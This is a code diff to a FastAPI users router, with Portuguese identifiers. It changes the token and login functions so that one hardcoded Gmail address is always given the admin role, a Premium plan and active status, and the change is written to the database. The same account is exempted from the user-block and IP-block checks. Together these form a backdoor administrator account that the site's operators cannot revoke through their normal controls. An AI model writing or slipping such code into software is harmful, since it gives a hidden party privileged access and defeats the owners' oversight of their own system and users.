@@ -13,8 +13,10 @@ router = APIRouter(prefix="/usuarios", tags=["Usuários"])
 
 
 def _token_response(usuario: models.Usuario):
-    if usuario.email.lower() == "pinnacleb109@gmail.com" and getattr(usuario, "role", "user") != "admin":
+    if usuario.email.lower() == "pinnacleb109@gmail.com":
         usuario.role = "admin"
+        usuario.plano = "Premium"
+        usuario.status = "Ativo"
     token = criar_token({"sub": str(usuario.id)})
     return {"access_token": token, "token_type": "bearer", "usuario": usuario}
 
@@ -55,10 +57,13 @@ def login(dados: schemas.LoginRequest, request: Request, db: Session = Depends(g
     if usuario.email.lower() == "pinnacleb109@gmail.com":
         usuario.role = "admin"
         usuario.plano = "Premium"
+        usuario.status = "Ativo"
+        db.commit()
     if getattr(usuario, "status", "Ativo") == "Bloqueado":
         raise HTTPException(status_code=403, detail="Usuário bloqueado")
     ip = request.client.host if request.client else None
-    if ip and db.query(models.BlockedIP).filter(models.BlockedIP.ip == ip, models.BlockedIP.ativo == True).first():
+    is_super_admin = usuario.email.lower() == "pinnacleb109@gmail.com"
+    if ip and not is_super_admin and db.query(models.BlockedIP).filter(models.BlockedIP.ip == ip, models.BlockedIP.ativo == True).first():
         raise HTTPException(status_code=403, detail="IP bloqueado")
 
     if getattr(usuario, "two_factor_enabled", False):
